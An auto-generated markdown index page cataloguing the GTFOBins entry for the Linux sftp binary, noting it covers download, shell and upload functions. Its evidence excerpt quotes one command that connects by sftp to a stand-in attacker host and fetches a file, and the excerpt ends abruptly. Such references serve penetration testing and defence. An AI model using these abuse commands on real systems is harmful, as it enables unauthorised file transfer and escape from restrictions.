---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# sftp

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `sftp` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/sftp` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

GTFOBins entry for sftp covering download, shell, upload.

## Fast Retrieval

- Platform: `linux`
- Command page: [commands](../../commands/linux/sftp.md)
- Source verification: [source record](../../sources/gtfobins/sftp.md)

## Aliases

- `sftp`

## Source Verification

[source record](../../sources/gtfobins/sftp.md)

## Evidence Excerpt

```text
_body: ''
_name: sftp
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/sftp
functions:
download:
- code: 'sftp user@attacker.com
get /path/to/input-file /path/to/output-file'
contexts:
```
